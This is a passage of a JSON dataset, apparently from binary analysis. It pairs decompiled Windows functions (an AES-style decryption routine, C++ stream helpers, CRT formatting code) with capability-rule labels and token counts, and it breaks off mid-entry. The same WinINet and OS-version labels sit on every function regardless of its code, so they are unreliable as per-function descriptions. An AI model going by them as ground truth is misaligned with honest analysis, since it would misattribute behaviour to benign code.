{
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "1400018e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_6h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1400018e0(uint8_t *arg1, uint8_t *arg2, int64_t arg3)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    int32_t iVar8;\n    int64_t iVar9;\n    uint8_t uVar10;\n    uint8_t *puVar11;\n    int64_t iVar12;\n    int64_t iVar13;\n    uint8_t uVar14;\n    uint8_t uVar15;\n    uint8_t uVar16;\n    uint8_t uVar17;\n    uint8_t uVar18;\n    uint8_t uVar19;\n    uint8_t uVar20;\n    uint8_t uVar21;\n    uint8_t *puVar22;\n    ulong var_58h;\n    int64_t iStack112;\n    int64_t iStack96;\n    uint8_t auStack88 [16];\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_6h;\n    \n    auStack88[0] = *arg1;\n    iVar12 = 0;\n    auStack88[4] = arg1[1];\n    auStack88[8] = arg1[2];\n    auStack88[12] = arg1[3];\n    auStack88[1] = arg1[4];\n    auStack88[5] = arg1[5];\n    auStack88[9] = arg1[6];\n    auStack88[13] = arg1[7];\n    auStack88[2] = arg1[8];\n    auStack88[6] = arg1[9];\n    auStack88[10] = arg1[10];\n    auStack88[14] = arg1[0xb];\n    auStack88[3] = arg1[0xc];\n    auStack88[7] = arg1[0xd];\n    auStack88[11] = arg1[0xe];\n    auStack88[15] = arg1[0xf];\n    puVar22 = arg3 + 0xa1;\n    do {\n        auStack88[iVar12] = auStack88[iVar12] ^ puVar22[-1];\n        auStack88[iVar12 + 4] = auStack88[iVar12 + 4] ^ *puVar22;\n        auStack88[iVar12 + 8] = auStack88[iVar12 + 8] ^ puVar22[1];\n        auStack88[iVar12 + 0xc] = auStack88[iVar12 + 0xc] ^ puVar22[2];\n        iVar12 = iVar12 + 1;\n        puVar22 = puVar22 + 4;\n    } while (iVar12 < 4);\n    puVar22 = arg3 + 0x92;\n    iStack96 = 9;\n    do {\n        iVar9 = 0;\n        iVar12 = iVar9;\n        do {\n            *(&var_40h + iVar12) = auStack88[iVar12];\n            *(&var_40h + iVar12 + 4) = auStack88[iVar12 + 4];\n            uVar3 = var_40h._7_1_;\n            uVar5 = var_40h._6_1_;\n            uVar2 = var_40h._5_1_;\n            uVar1 = var_40h._4_1_;\n            *(&var_38h + iVar12) = auStack88[iVar12 + 8];\n            uVar14 = var_38h._3_1_;\n            uVar21 = var_38h._2_1_;\n            uVar16 = var_38h._1_1_;\n            uVar20 = var_38h;\n            *(&var_38h + iVar12 + 4) = auStack88[iVar12 + 0xc];\n            iVar12 = iVar12 + 1;\n        } while (iVar12 < 4);\n        puVar11 = auStack88 + 5;\n        iVar8 = 1;\n        do {\n            iVar12 = iVar9;\n            if (iVar8 == 1) {\n                puVar11[-1] = uVar3;\n                *puVar11 = uVar1;\n                puVar11[1] = uVar2;\n                puVar11[2] = uVar5;\n            }\n            else if (iVar8 == 2) {\n                puVar11[-1] = uVar21;\n                *puVar11 = uVar14;\n                puVar11[1] = uVar20;\n                puVar11[2] = uVar16;\n            }\n            else if (iVar8 == 3) {\n                puVar11[-1] = var_38h._5_1_;\n                *puVar11 = var_38h._6_1_;\n                puVar11[1] = var_38h._7_1_;\n                puVar11[2] = var_38h._4_1_;\n                break;\n            }\n            iVar8 = iVar8 + 1;\n            puVar11 = puVar11 + 4;\n        } while (iVar8 < 4);\n        do {\n            auStack88[iVar12] = *(auStack88[iVar12] + 0x140039320);\n            auStack88[iVar12 + 4] = *(auStack88[iVar12 + 4] + 0x140039320);\n            auStack88[iVar12 + 8] = *(auStack88[iVar12 + 8] + 0x140039320);\n            auStack88[iVar12 + 0xc] = *(auStack88[iVar12 + 0xc] + 0x140039320);\n            iVar12 = iVar12 + 1;\n            puVar11 = puVar22;\n            iVar13 = iVar9;\n        } while (iVar12 < 4);\n        do {\n            auStack88[iVar13] = auStack88[iVar13] ^ puVar11[-2];\n            auStack88[iVar13 + 4] = auStack88[iVar13 + 4] ^ puVar11[-1];\n            auStack88[iVar13 + 8] = auStack88[iVar13 + 8] ^ *puVar11;\n            auStack88[iVar13 + 0xc] = auStack88[iVar13 + 0xc] ^ puVar11[1];\n            iVar13 = iVar13 + 1;\n            puVar11 = puVar11 + 4;\n        } while (iVar13 < 4);\n        do {\n            *(&var_40h + iVar9) = auStack88[iVar9];\n            *(&var_40h + iVar9 + 1) = auStack88[iVar9 + 1];\n            *(&var_40h + iVar9 + 2) = auStack88[iVar9 + 2];\n            *(&var_40h + iVar9 + 3) = auStack88[iVar9 + 3];\n            iVar9 = iVar9 + 4;\n        } while (iVar9 < 0x10);\n        iStack112 = 0;\n        do {\n            uVar1 = *(&var_40h + iStack112 + 4);\n            uVar5 = *(&var_40h + iStack112) * '\\x02';\n            uVar2 = *(&var_38h + iStack112);\n            if (0x7f < *(&var_40h + iStack112)) {\n                uVar5 = uVar5 ^ 0x1b;\n            }\n            uVar3 = *(&var_38h + iStack112 + 4);\n            uVar20 = uVar5 * '\\x02';\n            if (0x7f < uVar5) {\n                uVar20 = uVar5 * '\\x02' ^ 0x1b;\n            }\n            uVar16 = uVar1 * '\\x02';\n            if (0x7f < uVar1) {\n                uVar16 = uVar1 * '\\x02' ^ 0x1b;\n            }\n            uVar21 = uVar16 * '\\x02';\n            if (0x7f < uVar16) {\n                uVar21 = uVar16 * '\\x02' ^ 0x1b;\n            }\n            uVar14 = uVar2 * '\\x02';\n            if (0x7f < uVar2) {\n                uVar14 = uVar2 * '\\x02' ^ 0x1b;\n            }\n            uVar19 = uVar14 * '\\x02';\n            if (0x7f < uVar14) {\n                uVar19 = uVar14 * '\\x02' ^ 0x1b;\n            }\n            uVar6 = uVar3 * '\\x02';\n            if (0x7f < uVar3) {\n                uVar6 = uVar3 * '\\x02' ^ 0x1b;\n            }\n            uVar17 = uVar6 * '\\x02';\n            if (0x7f < uVar6) {\n                uVar17 = uVar6 * '\\x02' ^ 0x1b;\n            }\n            uVar7 = uVar20 * '\\x02';\n            if (0x7f < uVar20) {\n                uVar7 = uVar20 * '\\x02' ^ 0x1b;\n            }\n            uVar15 = uVar21 * '\\x02';\n            if (0x7f < uVar21) {\n                uVar15 = uVar21 * '\\x02' ^ 0x1b;\n            }\n            uVar18 = uVar19 * '\\x02';\n            if (0x7f < uVar19) {\n                uVar18 = uVar19 * '\\x02' ^ 0x1b;\n            }\n            uVar10 = uVar17 * '\\x02';\n            if (0x7f < uVar17) {\n                uVar10 = uVar17 * '\\x02' ^ 0x1b;\n            }\n            auStack88[iStack112] =\n                 uVar19 ^ uVar20 ^ uVar16 ^ uVar5 ^ uVar10 ^ uVar18 ^ uVar15 ^ uVar3 ^ uVar2 ^ uVar7 ^ uVar1;\n            uVar4 = *(&var_40h + iStack112);\n            auStack88[iStack112 + 4] =\n                 uVar17 ^ uVar21 ^ uVar15 ^ uVar18 ^ uVar10 ^ uVar14 ^ uVar7 ^ uVar16 ^ uVar3 ^ uVar2 ^ uVar4;\n            auStack88[iStack112 + 0xc] =\n                 uVar17 ^ uVar21 ^ uVar15 ^ uVar18 ^ uVar10 ^ uVar2 ^ uVar1 ^ uVar4 ^ uVar6 ^ uVar7 ^ uVar5;\n            iVar12 = iStack112 + 1;\n            auStack88[iStack112 + 8] =\n                 uVar19 ^ uVar20 ^ uVar15 ^ uVar18 ^ uVar10 ^ uVar3 ^ uVar6 ^ uVar14 ^ uVar7 ^ uVar1 ^ uVar4;\n            iStack112 = iVar12;\n        } while (iVar12 < 4);\n        puVar22 = puVar22 + -0x10;\n        iStack96 = iStack96 + -1;\n    } while (iStack96 != 0);\n    iVar9 = 0;\n    iVar12 = iVar9;\n    do {\n        *(&var_40h + iVar12) = auStack88[iVar12];\n        *(&var_40h + iVar12 + 1) = auStack88[iVar12 + 1];\n        *(&var_40h + iVar12 + 2) = auStack88[iVar12 + 2];\n        *(&var_40h + iVar12 + 3) = auStack88[iVar12 + 3];\n        iVar12 = iVar12 + 4;\n    } while (iVar12 < 0x10);\n    puVar22 = auStack88 + 5;\n    iVar8 = 1;\n    do {\n        if (iVar8 == 1) {\n            puVar22[-1] = var_40h._7_1_;\n            *puVar22 = var_40h._4_1_;\n            puVar22[1] = var_40h._5_1_;\n            puVar22[2] = var_40h._6_1_;\n        }\n        else if (iVar8 == 2) {\n            puVar22[-1] = var_38h._2_1_;\n            *puVar22 = var_38h._3_1_;\n            puVar22[1] = var_38h;\n            puVar22[2] = var_38h._1_1_;\n        }\n        else if (iVar8 == 3) {\n            puVar22[-1] = var_38h._5_1_;\n            *puVar22 = var_38h._6_1_;\n            puVar22[1] = var_38h._7_1_;\n            puVar22[2] = var_38h._4_1_;\n            break;\n        }\n        iVar8 = iVar8 + 1;\n        puVar22 = puVar22 + 4;\n    } while (iVar8 < 4);\n    do {\n        auStack88[iVar9 * 4] = *(auStack88[iVar9 * 4] + 0x140039320);\n        auStack88[iVar9 * 4 + 1] = *(auStack88[iVar9 * 4 + 1] + 0x140039320);\n        auStack88[iVar9 * 4 + 2] = *(auStack88[iVar9 * 4 + 2] + 0x140039320);\n        auStack88[iVar9 * 4 + 3] = *(auStack88[iVar9 * 4 + 3] + 0x140039320);\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 4);\n    iVar12 = 4;\n    puVar22 = auStack88 + 1;\n    puVar11 = arg3 + 8;\n    do {\n        puVar22[-1] = puVar22[-1] ^ puVar11[-8];\n        *puVar22 = *puVar22 ^ puVar11[-4];\n        puVar22[1] = puVar22[1] ^ *puVar11;\n        puVar22[2] = puVar22[2] ^ puVar11[4];\n        iVar12 = iVar12 + -1;\n        puVar22 = puVar22 + 4;\n        puVar11 = puVar11 + 1;\n    } while (iVar12 != 0);\n    *arg2 = auStack88[0];\n    arg2[1] = auStack88[4];\n    arg2[2] = auStack88[8];\n    arg2[3] = auStack88[12];\n    arg2[4] = auStack88[1];\n    arg2[5] = auStack88[5];\n    arg2[6] = auStack88[9];\n    arg2[7] = auStack88[13];\n    arg2[8] = auStack88[2];\n    arg2[9] = auStack88[6];\n    arg2[10] = auStack88[10];\n    arg2[0xb] = auStack88[14];\n    arg2[0xc] = auStack88[3];\n    arg2[0xd] = auStack88[7];\n    arg2[0xe] = auStack88[11];\n    arg2[0xf] = auStack88[15];\n    return;\n}\n",
        "token_count": 3551
    },
    "140002fe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ***** fcn.140002fe4(int64_t arg1)\n\n{\n    int64_t ****ppppiVar1;\n    uint64_t uVar2;\n    int64_t ***pppiVar3;\n    int64_t iVar4;\n    int64_t *****pppppiVar5;\n    int64_t *****pppppiVar6;\n    int64_t *****pppppiVar7;\n    int32_t in_R9D;\n    int64_t *****pppppiStackX8;\n    uchar auStackX16 [8];\n    int64_t *****pppppiStackX24;\n    int64_t *****pppppiStack48;\n    uchar auStack40 [8];\n    int64_t *****pppppiStack32;\n    \n    fcn.140004de8(auStackX16, 0);\n    pppppiVar5 = *0x14003f2b0;\n    pppppiStackX24 = *0x14003f2b0;\n    if (*0x14003f298 == 0) {\n        fcn.140004de8(&pppppiStackX8, 0);\n        if (*0x14003f298 == 0) {\n            *0x14003f410 = *0x14003f410 + 1;\n            *0x14003f298 = *0x14003f410;\n        }\n        fcn.140004e60(&pppppiStackX8);\n    }\n    uVar2 = *0x14003f298;\n    iVar4 = *(arg1 + 8);\n    if (*0x14003f298 < *(iVar4 + 0x18)) {\n        pppppiVar6 = *(*(iVar4 + 0x10) + *0x14003f298 * 8);\n        if (pppppiVar6 != NULL) goto code_r0x0001400030d4;\n    }\n    else {\n        pppppiVar6 = NULL;\n    }\n    if (*(iVar4 + 0x24) == '\\0') {\ncode_r0x000140003089:\n        if (pppppiVar6 != NULL) goto code_r0x0001400030d4;\n    }\n    else {\n        iVar4 = fcn.140005028();\n        if (uVar2 < *(iVar4 + 0x18)) {\n            pppppiVar6 = *(*(iVar4 + 0x10) + uVar2 * 8);\n            goto code_r0x000140003089;\n        }\n    }\n    pppppiVar6 = pppppiVar5;\n    if (pppppiVar5 != NULL) {\ncode_r0x0001400030d4:\n        fcn.140004e60(auStackX16);\n        return pppppiVar6;\n    }\n    pppppiVar5 = &pppppiStackX24;\n    iVar4 = fcn.1400039b4(pppppiVar5, arg1);\n    pppppiVar6 = pppppiStackX24;\n    if (iVar4 != -1) {\n        pppppiStackX8 = pppppiStackX24;\n        fcn.140004ff0(pppppiStackX24);\n        (**0x14002b340)(pppppiVar6);\n        *0x14003f2b0 = pppppiVar6;\n        goto code_r0x0001400030d4;\n    }\n    fcn.140003d3c();\n    fcn.140004de8(auStack40, 0);\n    pppppiVar6 = *0x14003f2a8;\n    pppppiStack32 = *0x14003f2a8;\n    if (*0x14003f428 == NULL) {\n        fcn.140004de8(&pppppiStack48, 0);\n        if (*0x14003f428 == NULL) {\n            *0x14003f410 = *0x14003f410 + 1;\n            *0x14003f428 = *0x14003f410;\n        }\n        fcn.140004e60(&pppppiStack48);\n    }\n    pppiVar3 = *0x14003f428;\n    ppppiVar1 = pppppiVar5[1];\n    if (*0x14003f428 < ppppiVar1[3]) {\n        pppppiVar7 = ppppiVar1[2][*0x14003f428];\n        if (pppppiVar7 != NULL) goto code_r0x0001400031e4;\n    }\n    else {\n        pppppiVar7 = NULL;\n    }\n    if (*(ppppiVar1 + 0x24) == '\\0') {\ncode_r0x000140003199:\n        if (pppppiVar7 != NULL) goto code_r0x0001400031e4;\n    }\n    else {\n        iVar4 = fcn.140005028();\n        if (pppiVar3 < *(iVar4 + 0x18)) {\n            pppppiVar7 = *(*(iVar4 + 0x10) + pppiVar3 * 8);\n            goto code_r0x000140003199;\n        }\n    }\n    pppppiVar7 = pppppiVar6;\n    if (pppppiVar6 == NULL) {\n        pppppiVar6 = &pppppiStack32;\n        iVar4 = fcn.140003a70(pppppiVar6, pppppiVar5);\n        pppppiVar7 = pppppiStack32;\n        if (iVar4 == -1) {\n            fcn.140003d3c();\n            if (in_R9D != 0) {\n                *pppppiVar6 = 0x14002b708;\n                pppppiVar6[3] = NULL;\n                pppppiVar6[8] = NULL;\n                pppppiVar6[9] = NULL;\n                pppppiVar6[10] = NULL;\n                pppppiVar6[2] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n            }\n            *(*(*pppppiVar6 + 4) + pppppiVar6) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n            *(*(*pppppiVar6 + 4) + -4 + pppppiVar6) = *(*pppppiVar6 + 4) + -0x10;\n            fcn.140003f50(*(*pppppiVar6 + 4) + pppppiVar6, pppppiVar5);\n            return pppppiVar6;\n        }\n        pppppiStack48 = pppppiStack32;\n        fcn.140004ff0(pppppiStack32);\n        (**0x14002b340)(pppppiVar7);\n        *0x14003f2a8 = pppppiVar7;\n    }\ncode_r0x0001400031e4:\n    fcn.140004e60(auStack40);\n    return pppppiVar7;\n}\n",
        "token_count": 1562
    },
    "1400030f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t *** fcn.1400030f4(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    int64_t ***pppiVar3;\n    int64_t ***pppiVar4;\n    int32_t in_R9D;\n    int64_t ***pppiStackX8;\n    uchar auStackX16 [8];\n    int64_t ***pppiStackX24;\n    \n    fcn.140004de8(auStackX16, 0);\n    pppiVar3 = *0x14003f2a8;\n    pppiStackX24 = *0x14003f2a8;\n    if (*0x14003f428 == 0) {\n        fcn.140004de8(&pppiStackX8, 0);\n        if (*0x14003f428 == 0) {\n            *0x14003f410 = *0x14003f410 + 1;\n            *0x14003f428 = *0x14003f410;\n        }\n        fcn.140004e60(&pppiStackX8);\n    }\n    uVar1 = *0x14003f428;\n    iVar2 = *(arg1 + 8);\n    if (*0x14003f428 < *(iVar2 + 0x18)) {\n        pppiVar4 = *(*(iVar2 + 0x10) + *0x14003f428 * 8);\n        if (pppiVar4 != NULL) goto code_r0x0001400031e4;\n    }\n    else {\n        pppiVar4 = NULL;\n    }\n    if (*(iVar2 + 0x24) == '\\0') {\ncode_r0x000140003199:\n        if (pppiVar4 != NULL) goto code_r0x0001400031e4;\n    }\n    else {\n        iVar2 = fcn.140005028();\n        if (uVar1 < *(iVar2 + 0x18)) {\n            pppiVar4 = *(*(iVar2 + 0x10) + uVar1 * 8);\n            goto code_r0x000140003199;\n        }\n    }\n    pppiVar4 = pppiVar3;\n    if (pppiVar3 == NULL) {\n        pppiVar3 = &pppiStackX24;\n        iVar2 = fcn.140003a70(pppiVar3, arg1);\n        pppiVar4 = pppiStackX24;\n        if (iVar2 == -1) {\n            fcn.140003d3c();\n            if (in_R9D != 0) {\n                *pppiVar3 = 0x14002b708;\n                pppiVar3[3] = NULL;\n                pppiVar3[8] = NULL;\n                pppiVar3[9] = NULL;\n                pppiVar3[10] = NULL;\n                pppiVar3[2] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n            }\n            *(*(*pppiVar3 + 4) + pppiVar3) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n            *(*(*pppiVar3 + 4) + -4 + pppiVar3) = *(*pppiVar3 + 4) + -0x10;\n            fcn.140003f50(*(*pppiVar3 + 4) + pppiVar3, arg1);\n            return pppiVar3;\n        }\n        pppiStackX8 = pppiStackX24;\n        fcn.140004ff0(pppiStackX24);\n        (**0x14002b340)(pppiVar4);\n        *0x14003f2a8 = pppiVar4;\n    }\ncode_r0x0001400031e4:\n    fcn.140004e60(auStackX16);\n    return pppiVar4;\n}\n",
        "token_count": 865
    },
    "14000bc3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.14000bc38(int64_t *arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint auStackX8 [2];\n    \n    if (*arg1 == 0) {\n        auStackX8[0] = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (*(arg1 + 2) == '\\0') {\n            arg1[1] = 0;\n            iVar2 = 0;\n            *(arg1 + 2) = 1;\n        }\n        else {\n            iVar2 = arg1[1];\n        }\n        iVar2 = fcn.1400199b4(auStackX8, iVar2);\n        *arg1 = iVar2;\n        (*_sym.imp.KERNEL32.dll_SetLastError)(auStackX8[0]);\n        if (iVar2 == 0) {\n            fcn.140012b4c();\n            pcVar1 = swi(3);\n            iVar2 = (*pcVar1)();\n            return iVar2;\n        }\n    }\n    return *arg1;\n}\n",
        "token_count": 235
    },
    "14000beb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14000bebc(ulong noname_0, ulong noname_1, ulong noname_2, ulong noname_3, ulong arg_30h)\n\n{\n    int64_t iVar1;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_bp_28h;\n    uint uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_18h._0_1_ = *0x1400401e0 == 0;\n    var_30h._0_1_ = 0;\n    var_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (var_18h) {\n        var_bp_28h._0_4_ = *0x14003e3b8;\n        var_bp_28h._4_4_ = *0x14003e3bc;\n        uStack40 = *0x14003e3c0;\n        uStack36 = *0x14003e3c4;\n    }\n    fcn.14000bf58(noname_0, noname_1, noname_2, noname_3);\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_10h != '\\0') {\n        iVar1 = fcn.14000bc38(&var_40h);\n        *(iVar1 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar1 = fcn.14000bc38(&var_40h);\n        *(iVar1 + 0x24) = var_10h._4_4_;\n    }\n    return;\n}\n",
        "token_count": 460
    },
    "14000d04": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.14000d044(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    \n    iVar1 = *(arg1 + 0x34);\n    if (iVar1 < 6) {\n        if (iVar1 != 5) {\n            if (iVar1 != 0) {\n                if (iVar1 == 1) {\n                    uVar2 = *(arg1 + 0x28);\n                    iVar4 = 1;\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                    if ((uVar2 >> 4 & 1) == 0) {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    else {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    goto code_r0x00014000d0af;\n                }\n                iVar1 = iVar1 + -2;\n                if (iVar1 == 0) {\n                    uVar2 = *(arg1 + 0x28);\n                    iVar4 = 2;\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                    if ((uVar2 >> 4 & 1) == 0) {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    else {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    goto code_r0x00014000d0af;\n                }\n                goto code_r0x00014000d082;\n            }\ncode_r0x00014000d17f:\n            uVar2 = *(arg1 + 0x28);\n            iVar4 = 4;\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n            if ((uVar2 >> 4 & 1) == 0) {\n                uVar3 = *(*(arg1 + 0x18) + -8);\n            }\n            else {\n                uVar3 = *(*(arg1 + 0x18) + -8);\n            }\n            goto code_r0x00014000d0af;\n        }\n    }\n    else if (((iVar1 != 6) && (iVar1 != 7)) && (iVar1 = iVar1 + -9,  iVar1 != 0)) {\ncode_r0x00014000d082:\n        if (iVar1 == 1) goto code_r0x00014000d17f;\n        if (iVar1 != 2) {\n            iVar4 = *(arg1 + 8);\n            *(iVar4 + 0x30) = 1;\n            *(iVar4 + 0x2c) = 0x16;\n            uVar3 = fcn.14000bf58(0, 0, 0, 0);\n            return uVar3 & 0xffffffffffffff00;\n        }\n    }\n    uVar2 = *(arg1 + 0x28);\n    iVar4 = 8;\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n    uVar3 = *(*(arg1 + 0x18) + -8);\ncode_r0x00014000d0af:\n    if (((uVar2 >> 4 & 1) != 0) && (uVar3 < 0)) {\n        uVar3 = -uVar3;\n        uVar2 = uVar2 | 0x40;\n        *(arg1 + 0x28) = uVar2;\n    }\n    if (*(arg1 + 0x30) < 0) {\n        *(arg1 + 0x30) = 1;\n    }\n    else {\n        *(arg1 + 0x28) = uVar2 & 0xfffffff7;\n        fcn.14000c4a8(arg1 + 0x50, *(arg1 + 0x30), *(arg1 + 8));\n    }\n    if (uVar3 == 0) {\n        *(arg1 + 0x28) = *(arg1 + 0x28) & 0xffffffdf;\n    }\n    *(arg1 + 0x4c) = 0;\n    if (iVar4 == 8) {\n        fcn.14000df54(arg1, uVar3);\n    }\n    else {\n        fcn.14000dbc0(arg1, uVar3 & 0xffffffff);\n    }\n    uVar2 = *(arg1 + 0x28);\n    if (((uVar2 >> 7 & 1) != 0) && ((*(arg1 + 0x48) == 0 || (**(arg1 + 0x40) != '0')))) {\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -1;\n        **(arg1 + 0x40) = 0x30;\n        *(arg1 + 0x48) = *(arg1 + 0x48) + 1;\n    }\n    return CONCAT71(uVar2 >> 0xf, 1);\n}\n",
        "token_count": 1163
    },
    "14000d22": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.14000d22c(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    \n    iVar1 = *(arg1 + 0x34);\n    if (iVar1 < 6) {\n        if (iVar1 != 5) {\n            if (iVar1 != 0) {\n                if (iVar1 == 1) {\n                    uVar2 = *(arg1 + 0x28);\n                    iVar4 = 1;\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                    if ((uVar2 >> 4 & 1) == 0) {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    else {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    goto code_r0x00014000d297;\n                }\n                iVar1 = iVar1 + -2;\n                if (iVar1 == 0) {\n                    uVar2 = *(arg1 + 0x28);\n                    iVar4 = 2;\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                    if ((uVar2 >> 4 & 1) == 0) {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    else {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    goto code_r0x00014000d297;\n                }\n                goto code_r0x00014000d26a;\n            }\ncode_r0x00014000d367:\n            uVar2 = *(arg1 + 0x28);\n            iVar4 = 4;\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n            if ((uVar2 >> 4 & 1) == 0) {\n                uVar3 = *(*(arg1 + 0x18) + -8);\n            }\n            else {\n                uVar3 = *(*(arg1 + 0x18) + -8);\n            }\n            goto code_r0x00014000d297;\n        }\n    }\n    else if (((iVar1 != 6) && (iVar1 != 7)) && (iVar1 = iVar1 + -9,  iVar1 != 0)) {\ncode_r0x00014000d26a:\n        if (iVar1 == 1) goto code_r0x00014000d367;\n        if (iVar1 != 2) {\n            iVar4 = *(arg1 + 8);\n            *(iVar4 + 0x30) = 1;\n            *(iVar4 + 0x2c) = 0x16;\n            uVar3 = fcn.14000bf58(0, 0, 0, 0);\n            return uVar3 & 0xffffffffffffff00;\n        }\n    }\n    uVar2 = *(arg1 + 0x28);\n    iVar4 = 8;\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n    uVar3 = *(*(arg1 + 0x18) + -8);\ncode_r0x00014000d297:\n    if (((uVar2 >> 4 & 1) != 0) && (uVar3 < 0)) {\n        uVar3 = -uVar3;\n        uVar2 = uVar2 | 0x40;\n        *(arg1 + 0x28) = uVar2;\n    }\n    if (*(arg1 + 0x30) < 0) {\n        *(arg1 + 0x30) = 1;\n    }\n    else {\n        *(arg1 + 0x28) = uVar2 & 0xfffffff7;\n        fcn.14000c550(arg1 + 0x50, *(arg1 + 0x30), *(arg1 + 8));\n    }\n    if (uVar3 == 0) {\n        *(arg1 + 0x28) = *(arg1 + 0x28) & 0xffffffdf;\n    }\n    *(arg1 + 0x4c) = 1;\n    if (iVar4 == 8) {\n        fcn.14000dfd0(arg1, uVar3);\n    }\n    else {\n        fcn.14000dc3c(arg1, uVar3 & 0xffffffff);\n    }\n    uVar2 = *(arg1 + 0x28) >> 7;\n    uVar3 = uVar2;\n    if (((uVar2 & 1) != 0) && ((uVar3 = 0,  *(arg1 + 0x48) == 0 || (**(arg1 + 0x40) != 0x30)))) {\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -2;\n        **(arg1 + 0x40) = 0x30;\n        *(arg1 + 0x48) = *(arg1 + 0x48) + 1;\n    }\n    return CONCAT71(uVar3 >> 8, 1);\n}\n",
        "token_count": 1177
    },
    "14000d41": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
